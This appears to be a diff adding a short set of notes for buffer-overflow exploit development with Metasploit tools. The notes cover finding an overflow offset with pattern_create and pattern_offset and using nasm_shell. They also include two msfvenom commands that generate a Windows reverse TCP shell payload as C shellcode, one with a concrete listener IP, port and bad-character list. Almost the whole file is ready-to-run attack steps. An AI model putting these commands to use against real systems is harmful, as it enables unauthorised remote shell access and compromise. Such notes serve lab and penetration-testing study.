@@ -1,0 +1,7 @@
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l NUMBER_OF_CHARACTERS 
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l NUMBER_OF_CHARACTERS -q THE_ADDRESS
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2700 -q 39694438
+msfvenom -p windows/shell_reverse_tcp LHOST=MYIP LPORT=MYPORT EXITFUNC=thread -f c -a x86 -b "BAD_CHARACTERS"
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.156.3 LPORT=1234 EXITFUNC=thread -f c -a x86 -b "\x00\x0A\x0D"
+/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
